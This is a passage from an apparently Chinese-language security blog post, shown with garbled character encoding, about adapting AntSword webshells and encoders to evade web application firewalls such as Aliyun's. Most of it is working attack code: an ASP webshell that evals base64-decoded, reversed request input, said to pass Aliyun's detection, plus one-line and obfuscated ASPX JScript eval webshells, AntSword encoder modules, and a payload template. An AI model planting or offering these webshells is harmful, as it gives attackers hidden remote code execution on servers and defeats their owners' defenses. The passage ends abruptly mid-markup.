%43%54%49%4f%4e%0a%27%20%1d%cb%16%0a%63%61%6c%6c%20%69%6e%69%74%43%6f%64%65%63%73%0a%44%69%6d%20%65%78%70%72%65%73%73%69%6f%6e%0a%65%78%70%72%65%73%73%69%6f%6e%20%3d%20%52%65%71%75%65%73%74%28%22%61%22%29%0a%27%20%52%65%73%70%6f%6e%73%65%2e%57%72%69%74%65%20%65%78%70%72%65%73%73%69%6f%6e%0a%44%69%6d%20%72%65%73%75%6c%74%0a%72%65%73%75%6c%74%20%3d%20%65%76%61%6c%28%62%61%73%65%36%34%44%65%63%6f%64%65%28%53%74%72%52%65%76%65%72%73%65%28%65%78%70%72%65%73%73%69%6f%6e%29%29%29&quot;))</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OPTION EXPLICIT</span><br><span class="line">const BASE_64_MAP_INIT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line">dim newline</span><br><span class="line">dim Base64EncMap(63)</span><br><span class="line">dim Base64DecMap(127)</span><br><span class="line">&#x27;åˆå§‹åŒ–å‡½æ•°</span><br><span class="line">PUBLIC SUB initCodecs()</span><br><span class="line">    &#x27; åˆå§‹åŒ–å˜é‡</span><br><span class="line">    newline = &quot;&lt;P&gt;&quot; &amp; chr(13) &amp; chr(10)</span><br><span class="line">    dim max, idx</span><br><span class="line">    max = len(BASE_64_MAP_INIT)</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64EncMap(idx) = mid(BASE_64_MAP_INIT, idx + 1, 1)</span><br><span class="line">    next</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64DecMap(ASC(Base64EncMap(idx))) = idx</span><br><span class="line">    next</span><br><span class="line">END SUB</span><br><span class="line">&#x27;Base64è§£å¯†å‡½æ•°</span><br><span class="line">PUBLIC FUNCTION base64Decode(scrambled)</span><br><span class="line">    if len(scrambled) = 0 then</span><br><span class="line">        base64Decode = &quot;&quot;</span><br><span class="line">        exit function</span><br><span class="line">    end if</span><br><span class="line">    dim realLen</span><br><span class="line">    realLen = len(scrambled)</span><br><span class="line">    do while mid(scrambled, realLen, 1) = &quot;=&quot;</span><br><span class="line">        realLen = realLen - 1</span><br><span class="line">    loop</span><br><span class="line">    dim ret, ndx, by4, first, second, third, fourth</span><br><span class="line">    ret = &quot;&quot;</span><br><span class="line">    by4 = (realLen \ 4) * 4</span><br><span class="line">    ndx = 1</span><br><span class="line">    do while ndx &lt;= by4</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        third = Base64DecMap(asc(mid(scrambled, ndx+2, 1)))</span><br><span class="line">        fourth = Base64DecMap(asc(mid(scrambled, ndx+3, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        ret = ret &amp; chr( ((third * 64) AND 255) + (fourth AND 63))</span><br><span class="line">        ndx = ndx + 4</span><br><span class="line">    loop</span><br><span class="line">    if ndx &lt; realLen then</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        if realLen MOD 4 = 3 then</span><br><span class="line">            third = Base64DecMap(asc(mid(scrambled,ndx+2,1)))</span><br><span class="line">            ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        end if</span><br><span class="line">    end if</span><br><span class="line">    base64Decode = ret</span><br><span class="line">END FUNCTION</span><br><span class="line">&#x27; åˆå§‹åŒ–</span><br><span class="line">call initCodecs</span><br><span class="line">Dim expression</span><br><span class="line">expression = Request(&quot;a&quot;)</span><br><span class="line">&#x27; Response.Write expression</span><br><span class="line">Dim result</span><br><span class="line">result = eval(base64Decode(StrReverse(expression)))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿™ä¸ªé©¬æ˜¯è¿‡é˜¿é‡Œäº‘çš„ï¼Œæˆ‘æ„Ÿè§‰æ˜¯é˜¿é‡Œäº‘å› ä¸ºæ˜¯è¯­ä¹‰æ£€æµ‹å˜›ï¼Œç„¶åè¿™ä¸ªé©¬æŠ¥500ï¼Œæ‰€ä»¥ç›´æ¥å°±è¿‡äº†<br>èƒ½ç”¨çš„</p><h4 id="antsword-aspxæ”¹é€ "><a href="#antsword-aspxæ”¹é€ " class="headerlink" title="antsword-aspxæ”¹é€ "></a>antsword-aspxæ”¹é€ </h4><h5 id="1-å‰ç½®çŸ¥è¯†-1"><a href="#1-å‰ç½®çŸ¥è¯†-1" class="headerlink" title="1.å‰ç½®çŸ¥è¯†"></a>1.å‰ç½®çŸ¥è¯†</h5><p>ASPï¼ˆActive Server Pagesï¼‰ä¸ASPXï¼ˆActive Server Pages Extendedï¼‰ä¹‹é—´å­˜åœ¨ä¸€äº›åŒºåˆ«å’Œè”ç³»ã€‚è®©æˆ‘ä»¬æ¥è¯¦ç»†äº†è§£å®ƒä»¬ä¹‹é—´çš„å…³ç³»ï¼š</p><ol><li><strong>ASPï¼ˆActive Server Pagesï¼‰</strong>ï¼š<ul><li>ASPæ˜¯Microsoftå¼€å‘çš„ä¸€ç§æœåŠ¡å™¨ç«¯è„šæœ¬æŠ€æœ¯ï¼Œç”¨äºåŠ¨æ€ç”Ÿæˆç½‘é¡µå†…å®¹ã€‚</li><li>ASPä½¿ç”¨VBScriptæˆ–JScriptç­‰è„šæœ¬è¯­è¨€ï¼Œä¸HTMLæ··åˆåœ¨ä¸€èµ·ï¼Œé€šè¿‡æœåŠ¡å™¨è§£é‡Šå™¨ï¼ˆå¦‚IISï¼‰è§£é‡Šæ‰§è¡Œè„šæœ¬ã€‚</li><li>ASPæ–‡ä»¶çš„æ‰©å±•åä¸º <code>.asp</code>ã€‚</li></ul></li><li><strong>ASPXï¼ˆActive Server Pages Extendedï¼‰</strong>ï¼š<ul><li>ASPXæ˜¯ASP.NETçš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯ASP.NETç½‘é¡µçš„æ–‡ä»¶æ‰©å±•åã€‚</li><li>ASPXæ–‡ä»¶æ˜¯åŸºäºXMLçš„ï¼Œä½¿ç”¨ASP.NETæ¡†æ¶æ¥ç”Ÿæˆå’Œå¤„ç†åŠ¨æ€ç½‘é¡µå†…å®¹ã€‚</li><li>ASPXæ–‡ä»¶å¯ä»¥åŒ…å«HTMLã€æœåŠ¡å™¨æ§ä»¶ã€æœåŠ¡å™¨ä»£ç ï¼ˆå¦‚C#æˆ–VB.NETï¼‰ç­‰å†…å®¹ï¼Œé€šè¿‡ASP.NETå¼•æ“è¿›è¡Œç¼–è¯‘å’Œæ‰§è¡Œã€‚</li><li>ASPXæ–‡ä»¶çš„æ‰©å±•åä¸º <code>.aspx</code>ã€‚</li></ul></li></ol><p><strong>å…³ç³»</strong>ï¼š</p><ul><li>ASPXå¯ä»¥çœ‹ä½œæ˜¯å¯¹ASPçš„æ‰©å±•å’Œå‡çº§ï¼Œå®ƒæ˜¯ASP.NETæ¡†æ¶ä¸‹çš„ä¸€ç§æŠ€æœ¯ã€‚</li><li>ASPXæŠ€æœ¯ä½¿ç”¨äº†æ›´å¼ºå¤§çš„ç¼–ç¨‹è¯­è¨€ï¼ˆå¦‚C#ã€VB.NETï¼‰ï¼Œå¹¶ä¸”é‡‡ç”¨äº†ASP.NETçš„å¼€å‘æ¨¡å‹ã€æ§ä»¶å’Œæ¡†æ¶ï¼Œå…·æœ‰æ›´å¥½çš„æ€§èƒ½ã€å®‰å…¨æ€§å’Œæ‰©å±•æ€§ã€‚</li><li>ASP.NETå¼•æ“å¯ä»¥åŒæ—¶å¤„ç†ASPå’ŒASPXæ–‡ä»¶ï¼Œä½†å®ƒä»¬ä¹‹é—´çš„å·¥ä½œåŸç†å’Œå®ç°æ–¹å¼æœ‰æ‰€ä¸åŒã€‚</li></ul><p>æ€»çš„æ¥è¯´ï¼ŒASPå’ŒASPXéƒ½æ˜¯ç”¨äºç”ŸæˆåŠ¨æ€ç½‘é¡µå†…å®¹çš„æŠ€æœ¯ï¼Œä½†ASPXæ˜¯ASP.NETæŠ€æœ¯çš„ä¸€éƒ¨åˆ†ï¼Œé‡‡ç”¨äº†æ›´ç°ä»£åŒ–ã€å¼ºå¤§çš„å¼€å‘æ¨¡å‹å’Œè¯­è¨€ï¼Œæ›´é€‚åˆå¼€å‘å¤§å‹ã€å¤æ‚çš„Webåº”ç”¨ç¨‹åºã€‚é€‰æ‹©ASPè¿˜æ˜¯ASPXå–å†³äºé¡¹ç›®éœ€æ±‚ã€å¼€å‘å›¢é˜ŸæŠ€æœ¯æ ˆå’Œé¢„æœŸçš„æ€§èƒ½å’ŒåŠŸèƒ½è¦æ±‚ã€‚</p><p>ASPï¼ˆActive Server Pagesï¼‰å’ŒASP.NETï¼ˆActive Server Pages.NETï¼‰æ˜¯ä¸¤ç§ä¸åŒçš„Webå¼€å‘æŠ€æœ¯ï¼Œå…·æœ‰ä¸€äº›é‡è¦çš„åŒºåˆ«ã€‚</p><ol><li><strong>è¯­è¨€å’ŒæŠ€æœ¯</strong>ï¼š<ul><li><strong>ASP</strong>ï¼šASPä½¿ç”¨VBScriptæˆ–JScriptç­‰è„šæœ¬è¯­è¨€æ¥ç¼–å†™æœåŠ¡å™¨ç«¯ä»£ç ã€‚å®ƒæ˜¯ç»å…¸çš„ASPæŠ€æœ¯ï¼Œé‡‡ç”¨ç±»ä¼¼äºHTMLçš„è¯­æ³•ï¼Œä¸å‰ç«¯çš„HTMLæ··åˆåœ¨ä¸€èµ·ï¼Œå¹¶ä¸”æ²¡æœ‰ä¸¥æ ¼çš„ä»£ç åˆ†å±‚ç»“æ„ã€‚</li><li><strong>ASP.NET</strong>ï¼šASP.NETé‡‡ç”¨æ›´å¼ºå¤§çš„ç¼–ç¨‹è¯­è¨€ï¼Œå¦‚C#ã€VB.NETç­‰ï¼Œå¹¶ä¸”æä¾›äº†æ›´å®Œå–„çš„å¼€å‘æ¡†æ¶ã€‚å®ƒä½¿ç”¨.NETå¹³å°ï¼Œå…·æœ‰æ›´å¼ºå¤§çš„åŠŸèƒ½å’Œæ›´å¥½çš„æ€§èƒ½ä¼˜åŒ–ã€‚</li></ul></li><li><strong>å¼€å‘æ¨¡å‹</strong>ï¼š<ul><li><strong>ASP</strong>ï¼šASPé‡‡ç”¨ç»å…¸çš„è„šæœ¬å¼å¼€å‘æ¨¡å‹ï¼Œå³åœ¨é¡µé¢ä¸­åµŒå…¥è„šæœ¬ä»£ç ä¸HTMLæ··åˆï¼Œä»£ç å’Œè®¾è®¡æ··åˆåœ¨ä¸€èµ·ã€‚</li><li><strong>ASP.NET</strong>ï¼šASP.NETé‡‡ç”¨åˆ†ç¦»å¼çš„å¼€å‘æ¨¡å‹ï¼Œä½¿ç”¨ä»£ç åˆ†ç¦»çš„æ–¹å¼ï¼Œå°†é€»è¾‘ä»£ç ä¸UIä»£ç åˆ†ç¦»å¼€æ¥ï¼Œé€šè¿‡ä»£ç æ–‡ä»¶å’ŒUIæ–‡ä»¶åˆ†åˆ«ç®¡ç†ã€‚</li></ul></li><li><strong>æ€§èƒ½</strong>ï¼š<ul><li><strong>ASP</strong>ï¼šASPçš„æ€§èƒ½ç›¸å¯¹è¾ƒä½ï¼Œå› ä¸ºå®ƒæ˜¯åŸºäºè„šæœ¬è¯­è¨€æ‰§è¡Œçš„ï¼Œå¹¶ä¸”æ²¡æœ‰è¿›è¡Œå¼ºå¤§çš„ç¼–è¯‘ä¼˜åŒ–ã€‚</li><li><strong>ASP.NET</strong>ï¼šASP.NETé‡‡ç”¨ç¼–è¯‘å‹è¯­è¨€ï¼ˆå¦‚C#ã€VB.NETï¼‰ï¼Œå¹¶ä¸”åœ¨è¿è¡Œæ—¶è¿›è¡Œäº†å¼ºå¤§çš„ç¼–è¯‘å’Œä¼˜åŒ–ï¼Œå› æ­¤å…·æœ‰æ›´å¥½çš„æ€§èƒ½å’Œæ‰©å±•æ€§ã€‚</li></ul></li><li><strong>çŠ¶æ€ç®¡ç†</strong>ï¼š<ul><li><strong>ASP</strong>ï¼šASPä¸­çš„çŠ¶æ€ç®¡ç†ç›¸å¯¹ç®€å•ï¼Œä½¿ç”¨Sessionå’ŒCookieç­‰æŠ€æœ¯æ¥ç®¡ç†çŠ¶æ€ã€‚</li><li><strong>ASP.NET</strong>ï¼šASP.NETæä¾›äº†æ›´å¤šçš„çŠ¶æ€ç®¡ç†é€‰é¡¹ï¼Œå¦‚ViewStateã€Sessionã€Cookiesã€Applicationç­‰ï¼Œå¹¶ä¸”æä¾›äº†æ›´çµæ´»çš„ç¼“å­˜ç®¡ç†ã€‚</li></ul></li><li><strong>å®‰å…¨æ€§</strong>ï¼š<ul><li><strong>ASP</strong>ï¼šASPç›¸å¯¹è¾ƒä¸ºç®€å•ï¼Œå®‰å…¨æ€§å–å†³äºå¼€å‘è€…è‡ªè¡Œå¤„ç†ï¼Œå®¹æ˜“å‡ºç°å®‰å…¨æ¼æ´ã€‚</li><li><strong>ASP.NET</strong>ï¼šASP.NETæä¾›äº†æ›´å¤šçš„å®‰å…¨æ€§ç‰¹æ€§å’Œæœºåˆ¶ï¼Œå¦‚è¡¨å•è®¤è¯ã€è§’è‰²ç®¡ç†ã€åŠ å¯†æŠ€æœ¯ç­‰ï¼Œæé«˜äº†Webåº”ç”¨çš„å®‰å…¨æ€§ã€‚</li></ul></li><li><strong>æ¡†æ¶å’Œæ§ä»¶</strong>ï¼š<ul><li><strong>ASP</strong>ï¼šASPç›¸å¯¹ç®€å•ï¼Œæ²¡æœ‰ä¸°å¯Œçš„å¼€å‘æ¡†æ¶å’Œç°æˆçš„æ§ä»¶åº“ï¼Œå¼€å‘è€…éœ€è¦è‡ªè¡Œå®ç°å„ç§åŠŸèƒ½ã€‚</li><li><strong>ASP.NET</strong>ï¼šASP.NETæ‹¥æœ‰å¼ºå¤§çš„å¼€å‘æ¡†æ¶å’Œä¸°å¯Œçš„æ§ä»¶åº“ï¼Œå¦‚ASP.NET MVCã€ASP.NET Web Formsç­‰ï¼Œæä¾›äº†å¤§é‡ç°æˆçš„æ§ä»¶å’ŒåŠŸèƒ½æ¨¡å—ï¼Œæ–¹ä¾¿å¿«é€Ÿå¼€å‘ã€‚</li></ul></li></ol><p>æ€»çš„æ¥è¯´ï¼ŒASP.NETç›¸æ¯”ASPå…·æœ‰æ›´å¼ºå¤§çš„åŠŸèƒ½ã€æ›´å¥½çš„æ€§èƒ½å’Œæ›´é«˜çš„å®‰å…¨æ€§ï¼Œé€‚åˆå¼€å‘å¤§å‹å’Œå¤æ‚çš„Webåº”ç”¨ç¨‹åºã€‚è€ŒASPæ›´é€‚åˆç®€å•çš„Webé¡µé¢æˆ–å°å‹é¡¹ç›®ã€‚é€‰æ‹©ASPè¿˜æ˜¯ASP.NETå–å†³äºé¡¹ç›®çš„éœ€æ±‚ã€å¼€å‘å›¢é˜Ÿçš„æŠ€æœ¯æ ˆä»¥åŠé¢„æœŸçš„æ€§èƒ½å’Œå®‰å…¨æ€§è¦æ±‚ã€‚</p><p>ç¬”è€…è¿™é‡Œæ­å»ºäº†aspçš„ç¯å¢ƒï¼Œä½†æ˜¯ç›´æ¥èƒ½ç”¨aspxçš„æœ¨é©¬ã€‚</p><h5 id="2-aspç¼–ç å™¨"><a href="#2-aspç¼–ç å™¨" class="headerlink" title="2.aspç¼–ç å™¨"></a>2.aspç¼–ç å™¨</h5><p>è€è§„çŸ©ï¼Œå…ˆçœ‹æœ¨é©¬<br><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code></p><p>å¾ˆç®€å•çš„ä¸€å¥è¯ï¼Œå£°æ˜å’Œevalæ‰§è¡Œå³å¯<br>é‚£ä¹ˆæˆ‘ä»¬ç¼–ç è¿˜æ˜¯è€æ ·å­ï¼Œå…ˆè¿›è¡Œbase64ç¼–ç </p><p>å…ˆçœ‹ä¸‹åŸæœ¬çš„payload</p><p><img src="/images/antsword-bypasswaf/image-20240403141207211.png" alt="image-20240403141207211"></p><p>æ·»åŠ ç¼–ç å™¨</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * aspx::base64ç¼–ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2024/04/03 14:12:58</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   è¿æ¥å¯†ç </span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//data[pwd] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;).split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);</span></span><br><span class="line">  <span class="comment">// shell åœ¨æ¥æ”¶åˆ° payload åï¼Œå…ˆå¤„ç† pwd å‚æ•°ä¸‹çš„å†…å®¹ï¼Œ</span></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆ é™¤ _ åŸæœ‰çš„payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// è¿”å›ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç›¸åº”çš„æˆ‘ä»¬çš„é©¬è¦è¿›è¡Œbase64è§£ç </p><p>aspxæ¥æ”¶ jscript c# c ç­‰è¯­è¨€ï¼Œå¥½åƒå†°èæ˜¯c#çš„<br>èšå‰‘çš„ï¼Œä¸€èˆ¬çŸ­ç‚¹çš„æ˜¯jscriptï¼Œä¸èƒ½ä»£è¡¨å…¨éƒ¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">var a=&#x27;efasnu&#x27;;</span><br><span class="line">var c=a(5)+a(4)+a(3)+a(2)+a(1)+a(0);</span><br><span class="line">try &#123;</span><br><span class="line">var data = Request.Item[&quot;a&quot;];</span><br><span class="line">var bytes = System.Convert.FromBase64String(data);</span><br><span class="line">var decodedText = System.Text.Encoding.UTF8.GetString(bytes);</span><br><span class="line">eval(decodedText,c);</span><br><span class="line">&#125; catch (ex) &#123;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…ˆä¸ç”¨å…æ€ï¼Œèƒ½ç”¨å°±è¡Œ<br>å…ˆå°†ä¼ é€’è¿‡æ¥çš„æ•°æ®è¿›è¡Œè§£ç ï¼Œç„¶åä¼ ç»™eval</p><p><img src="/images/antsword-bypasswaf/image-20240407092418601.png" alt="image-20240407092418601"></p><p><img src="/images/antsword-bypasswaf/image-20240407092440159.png" alt="image-20240407092440159"></p><p>å°±å¯ä»¥å®ç°äº†</p><p>æ¥ä¸‹æ¥å®ç°é€†åºçš„ç¼–ç å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * aspx::base64ç¼–ç å™¨</span><br><span class="line"> * Create at: 2024/04/03 14:12:58</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">&#x27;use strict&#x27;;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">* @param  &#123;String&#125; pwd   è¿æ¥å¯†ç </span><br><span class="line">* @param  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span><br><span class="line">* @return &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span><br><span class="line">*/</span><br><span class="line">module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">  data[pwd] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;).split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);</span><br><span class="line">  // shell åœ¨æ¥æ”¶åˆ° payload åï¼Œå…ˆå¤„ç† pwd å‚æ•°ä¸‹çš„å†…å®¹ï¼Œ</span><br><span class="line">  //data[pwd] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;);</span><br><span class="line">  // ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span><br><span class="line"></span><br><span class="line">  // åˆ é™¤ _ åŸæœ‰çš„payload</span><br><span class="line">  delete data[&#x27;_&#x27;];</span><br><span class="line">  // è¿”å›ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ¨é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">var a=&#x27;efasnu&#x27;;</span><br><span class="line">var c=a(5)+a(4)+a(3)+a(2)+a(1)+a(0);</span><br><span class="line">try &#123;</span><br><span class="line">var c = Request.Item[&quot;a&quot;];</span><br><span class="line">var data = c.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);</span><br><span class="line">var bytes = System.Convert.FromBase64String(data);</span><br><span class="line">var decodedText = System.Text.Encoding.UTF8.GetString(bytes);</span><br><span class="line">eval(decodedText,c);</span><br><span class="line">&#125; catch (ex) &#123;</span><br><span class="line">    // ä¸æ‰§è¡Œä»»ä½•è¾“å‡ºæ“ä½œï¼Œå³ä½¿æœ‰å¼‚å¸¸ä¹Ÿä¸è¾“å‡ºåˆ°é¡µé¢ä¸Š</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ›´æ”¹äº†ä¸€è¡Œï¼Œå°±è¡Œ,é€†åºä¸€ä¸‹<br>çœ‹ä¸‹æ•ˆæœ<br><img src="/images/antsword-bypasswaf/image-20240407094224598.png" alt="image-20240407094224598"></p><p><img src="/images/antsword-bypasswaf/image-20240407094233967.png" alt="image-20240407094233967"></p><h5 id="3-aspxè§£ç å™¨"><a href="#3-aspxè§£ç å™¨" class="headerlink" title="3.aspxè§£ç å™¨"></a>3.aspxè§£ç å™¨</h5><p>å‚è€ƒ<a href="https://www.youncyb.cn/?p=700">https://www.youncyb.cn/?p=700</a></p><p>å¥½ï¼Œçœ‹å®Œç¼–ç å™¨ï¼Œçœ‹ä¸‹è§£ç å™¨ã€‚<br>è¿™é‡Œåˆè¦ç ”ç©¶æºç äº†</p><p><img src="/images/antsword-bypasswaf/image-20240407094532267.png" alt="image-20240407094532267"></p><p>å¯¹è§£ç å™¨çš„ç†è§£ï¼Œä¸»è¦çœ‹è¿™ä¸€æ®µï¼Œ<br>è¿™ä¸€æ®µï¼Œå¹¶æ²¡æœ‰é¢„ç•™è§£ç å™¨çš„å˜é‡<br>æˆ‘ä»¬è¦å»phpçš„index.jsä¸­æ‰£ä¸€æ®µï¼Œ<br><img src="/images/antsword-bypasswaf/image-20240407095256423.png" alt="image-20240407095256423"></p><p>ä¹Ÿå°±æ˜¯asencodeé‚£é‡Œï¼Œ<br><img src="/images/antsword-bypasswaf/image-20240407155618044.png" alt="image-20240407155618044"></p><p>åœ¨aspxä¸­çš„index.jsä¸­ç»™ä»–åŠ ä¸Šã€‚<br>ç¬¬äºŒéƒ¨<br>å°†data[â€˜_â€™]æ¢æ‰ï¼Œæ¢æˆ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="string">&#x27;_&#x27;</span>] = <span class="string">`Response.Write(&quot;<span class="subst">$&#123;tag_s.substr(<span class="number">0</span>,tag_s.length<span class="regexp">/2)&#125;&quot;+&quot;$&#123;tag_s.substr(tag_s.length/</span><span class="number">2</span>)&#125;</span>&quot;);<span class="subst">$&#123;asencCode&#125;</span>;var err:Exception;try&#123;eval(&quot;var opcode=&#x27;&#x27;;&quot; + System.Text.Encoding.GetEncoding(&quot;<span class="subst">$&#123;aspxencode&#125;</span>&quot;).GetString(System.Convert.FromBase64String(&quot;<span class="subst">$&#123;base64Code&#125;</span>&quot;)) + &quot;;Response.Write(asenc(opcode));&quot;,&quot;unsafe&quot;);&#125;catch(err)&#123;Response.Write(asenc(&quot;ERROR:// &quot;+err.message));&#125;Response.Write(&quot;<span class="subst">$&#123;tag_e.substr(<span class="number">0</span>,tag_e.length<span class="regexp">/2)&#125;&quot;+&quot;$&#123;tag_e.substr(tag_e.length/</span><span class="number">2</span>)&#125;</span>&quot;);Response.End();`</span>;</span><br></pre></td></tr></table></figure><p>è§£é‡Šä¸€ä¸‹ä»€ä¹ˆæ„æ€ï¼Œä¸Šé¢è¯´äº†ï¼Œaspxå¹¶æ²¡æœ‰é¢„ç•™å¯¹åº”çš„asencCodeï¼Œæ‰€ä»¥æˆ‘ä»¬è‡ªå·±åŠ ä¸Šï¼Œæ”¾åœ¨payloadä¸­ï¼Œæ¥ä¸‹æ¥å®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œç”¨äºæ¥å—åŠŸèƒ½æ‰§è¡Œçš„ç»“æœï¼Œæœ€åè¾“å‡ºçš„æ—¶å€™ä¼šå…ˆè°ƒç”¨asencå‡½æ•°ï¼Œ</p><p><img src="/images/antsword-bypasswaf/image-20240407160002646.png" alt="image-20240407160002646"></p><p>è¿™ä¸ªasencå‡½æ•°çš„å®šä¹‰ï¼Œå°±æ˜¯æˆ‘ä»¬è‡ªå·±æƒ³å®šä¹‰çš„è¾“å‡ºå†…å®¹äº†ï¼Œè¿™é‡Œå…ˆè¿›è¡Œbase64å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function asenc(opcode)&#123;</span><br><span class="line">    var bytesToEncode = System.Text.Encoding.UTF8.GetBytes(opcode);</span><br><span class="line">    return System.Convert.ToBase64String(bytesToEncode);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ­¥ï¼Œæœ€å…³é”®çš„ï¼Œæ”¹æºç </p><p>å…ˆäº†è§£ä¸€ä¸‹ï¼Œå½“æˆ‘ä»¬åœ¨èšå‰‘ä¸­æ‰§è¡Œdirçš„æ—¶å€™ï¼Œæ˜¯æ€ä¹ˆæ ·å‘åŒ…çš„<br><img 